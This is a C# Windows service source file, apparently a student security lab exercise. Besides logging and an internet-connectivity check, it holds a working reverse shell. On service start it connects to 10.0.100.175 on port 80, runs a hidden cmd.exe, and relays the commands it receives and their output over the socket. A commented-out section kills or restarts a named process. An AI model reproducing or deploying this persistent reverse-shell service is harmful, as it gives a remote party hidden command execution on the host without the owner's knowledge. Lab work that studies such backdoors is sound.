using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net.Sockets;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;

namespace _18521146_LAB1_CCMD
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer(); // name space(using System.Timers;)
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000; //number in milisecinds 
            timer.Enabled = true;

            //Cau 3
            using (TcpClient client = new TcpClient("10.0.100.175", 80))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        protected override void OnStop()
        {
            WriteToFile("Service is stopped at " + DateTime.Now);



        }

        static StreamWriter streamWriter;
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            //Cau2
            //string ProcessName = "LCore";                                                                   //App name

            //WriteToFile("Service is recall at " + DateTime.Now);
            //if (IsProcessRunning(ProcessName))
            //{
            //    WriteToFile("Process is running " + DateTime.Now);

            //    foreach (Process process in Process.GetProcessesByName(ProcessName))                        // If running => Kill (stop) process
            //    {
            //        process.Kill();
            //    }
            //    WriteToFile("\t=> Stop Process " + DateTime.Now);
            //}
            //else                                                                                            // If not running => Start process
            //{
            //    WriteToFile("Process is not running " + DateTime.Now);
            //    Process process = new Process();                                                            // Create new process 
            //    process.StartInfo.FileName = "C:\\Program Files\\Logitech Gaming Software\\LCore.exe";
            //    process.Start();
            //    WriteToFile("\t=> Start Process " + DateTime.Now);
            //}


            
            
            if(IsConnectedToInternet())
            {
                WriteToFile("Connected Internet " + DateTime.Now);
            }
            else
            {
                WriteToFile("No Internet " + DateTime.Now);
            }

        }

        public bool IsConnectedToInternet()
        {
            string host = "nettruyen.com";  
            bool result = false;
            Ping p = new Ping();
            try
            {
                PingReply reply = p.Send(host, 3000);
                if (reply.Status == IPStatus.Success)
                    return true;
            }
            catch { }
            return result;
        }

        public bool IsSecureConnection { get; }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLogCau3_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to. 
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        private bool IsProcessRunning(string ProcessName)
        {
            foreach (Process clsProcess in Process.GetProcesses())
            {
                if (clsProcess.ProcessName.Contains(ProcessName))
                {
                    return true;
                }
            }
            return false;
        }

    }
}
